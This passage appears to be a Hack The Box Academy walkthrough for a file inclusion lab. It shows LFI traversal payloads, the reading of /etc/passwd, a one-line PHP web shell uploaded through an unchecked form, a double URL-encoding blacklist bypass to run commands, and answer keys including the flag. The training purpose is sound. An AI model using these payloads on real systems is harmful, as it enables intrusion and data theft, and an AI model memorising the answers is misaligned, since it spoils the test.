At last, students need to use a browser and navigate to `http://STMIP/shell.php` from `Pwnbox`/`PMVPN`, and notice the change that takes place in the `/var/log/apache2/error.log` file:

![File_Inclusion_Walkthrough_Image_20.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_20.png)

The warning message reads:

```shell-session
[php7:warn] [pid 1834] [client 10.10.14.32:32890] PHP Warning:  system() has been disabled for security reasons in /var/www/html/shell.php on line 1
```

For the second part of the question, students need to go to line 312 in the `/etc/php/7.4/apache2/php.ini` file and read the comments above the `disable_functions` directive:

```shell-session
; This directive allows you to disable certain functions for security reasons<br>
; It receives a comma-delimited list of function names.<br>
; [http://php.net/disable-functions](http://php.net/disable-functions "http://php.net/disable-functions")
```

Answer: `security`

# Skills Assessment - File Inclusion

## Question 1

### "Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer."

Students will begin by spawning the target machine. Once it's active, they will use Firefox to navigate to `http://STMIP:STMPO`, ensuring that `Burp Suite` is running and properly configured to proxy the traffic. This setup will facilitate request interception and make modifying and replaying HTTP requests easier.

Upon viewing the page source, students will observe that images within the page are retrieved from the `/api/image.php` endpoint, which uses the parameter `p` followed by what looks like an MD5 hash as the parameter value to reference the specific image file.

![File_Inclusion_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_21.png)

Since the web server response contains `Content-Type: image/jpeg`, students will need to enable Images so these requests show up on `HTTP History`. This can be done by visiting `Proxy -> HTTP History -> Filter settings -> Filter by MIME type` and ticking `Images`.

![File_Inclusion_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_22.png)

Students can now refresh the page, and the requests will show up in `HTTP History`. Students will click on one of the requests and send it to Repeater (`CTRL + R`).

![File_Inclusion_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_23.png)

From here, students can attempt to replace the `p` parameter value with a basic LFI payload, such as `../../../../etc/passwd`, along with common variations. Through testing, they'll discover that the payload `....//....//....//....//etc/passwd` is successful. This suggests that the application is likely using a `str_replace` function to strip out instances of `../` non-recursively.

![File_Inclusion_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_24.png)

By completing the previous step, students will have confirmed the presence of an LFI vulnerability. Next, they should attempt to read various source code files from the application, such as `contact.php`, `apply.php`, and any other accessible files.

While reviewing the source code of `contact.php`, students will identify a new parameter called `region`. However, it is important to note that this parameter is subject to security validation checks. The code is designed to block the inclusion of unintended files by disallowing certain characters commonly used in directory traversal attacks.

![File_Inclusion_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_25.png)

Reading the code, students should notice that if the value of the `region` parameter does not contain any dots (`.`) or forward slashes (`/`), it will pass the validation check, be URL-decoded and used in the `include` function to dynamically include a PHP file in the response. This means that if students can find a way to upload a `.php` file containing PHP code to the server while bypassing the character blacklist, they could potentially achieve code execution.

Luckily, the web application offers file upload functionality on the `apply.php` page and uses the `/api/apply.php` endpoint to submit the file. It also does not seem to do any verification on the file extensions, even though the page asks for `.docx` and `.pdf`.

![File_Inclusion_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_26.png)

Since we do not know where the uploaded files are being stored, students can use the previous identified LFI vulnerability to read the source code of the file that handles the upload functionality (`/api/apply.php`).

![File_Inclusion_Walkthrough_Image_27.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_27.png)

After reading the source code, students will understand that the uploaded files are ultimately moved to the `/uploads` directory inside the server's web root and named using the `md5_file()` function, which computes an MD5 hash based on the file's contents.

With this knowledge, students can create a simple `PHP` web shell and get the MD5 hash of its contents using `md5sum` to compute what will be the file name on the server side inside the `/uploads` directory once the file is uploaded.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
md5sum shell.php
```

```bash-session
┌─[eu-academy-6]─[10.10.15.173]─[htb-ac-569447@htb-hhelxeqeyh]─[~]
└──╼ [★]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

┌─[eu-academy-6]─[10.10.15.173]─[htb-ac-569447@htb-hhelxeqeyh]─[~]
└──╼ [★]$ md5sum shell.php 
fc023fcacb27a7ad72d605c4e300b389  shell.php
```

Having calculated the hash as `fc023fcacb27a7ad72d605c4e300b389`, students can now upload the newly created web shell.

![File_Inclusion_Walkthrough_Image_28.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_28.png)

Once uploaded, students must access the file via the `region` parameter on `contact.php`. Students can bypass the server-side protection (not having `.` and `/` in its value) by URL-encoding their payload `../uploads/fc023fcacb27a7ad72d605c4e300b389` and then appending the parameter `cmd` with a value such as `id`.

Ultimately, students will conclude that URL-encoding the payload once will still trigger the protection; hence, students will need to URL-encode the payload once more (double URL-encoding) to bypass the server-side protection.

Double URL-encoding works here because when the server processes the `region` parameter, it performs a single URL decoding step. If the input is double-encoded, the first decoding step transforms `%252E%252E%252F` into `%2E%2E%2F`, which does not directly contain `.` or `/`.

As a result, the validation check does not detect any disallowed characters, allowing the input to pass through. As there is another decoding step later in the process, `%2E%2E%2F` becomes `../`, effectively bypassing the blacklist and allowing directory traversal.

![File_Inclusion_Walkthrough_Image_29.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_29.png)

![File_Inclusion_Walkthrough_Image_30.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_30.png)

This confirms code execution; students just need to adapt the command to retrieve the flag's content located in the root directory, an example could be: `%252E%252E%252Fuploads%252Ffc023fcacb27a7ad72d605c4e300b389&cmd=cat+/*.txt`

![File_Inclusion_Walkthrough_Image_31.png](https://academy.hackthebox.com/storage/walkthroughs/19/File_Inclusion_Walkthrough_Image_31.png)

Students will retrieve the flag from the server's response and submit it as the answer.

Answer: `eedbb78d4800aa45573840ed6bd2d1e3`